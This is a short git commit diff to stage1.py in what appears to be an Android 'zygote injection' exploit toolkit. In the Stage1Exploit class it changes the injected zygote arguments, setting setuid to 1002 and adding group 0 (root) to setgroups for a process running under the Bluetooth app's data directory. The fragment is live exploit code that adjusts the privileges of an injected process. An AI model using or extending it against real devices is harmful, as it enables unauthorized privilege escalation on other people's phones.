ebb794feb2c73402a3440c4c96cefe3bb5355c26
コアラ <189215038+coara-chocomaru@users.noreply.github.com>
2026-08-27 18:19:57 +0900

    Update setuid and setgroups values in stage1.py

--- zygote_injection_toolkit/stage1.py
+++ zygote_injection_toolkit/stage1.py
@@ -189,9 +189,9 @@ class Stage1Exploit:
         assert "," not in command
         # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
-            "--setuid=1000",
+            "--setuid=1002",
             "--setgid=1000",
-            "--setgroups=1000",
+            "--setgroups=1000,0",
             "--target-sdk-version=28",
             "--app-data-dir=/data/user/0/com.android.bluetooth",
             "--runtime-args",
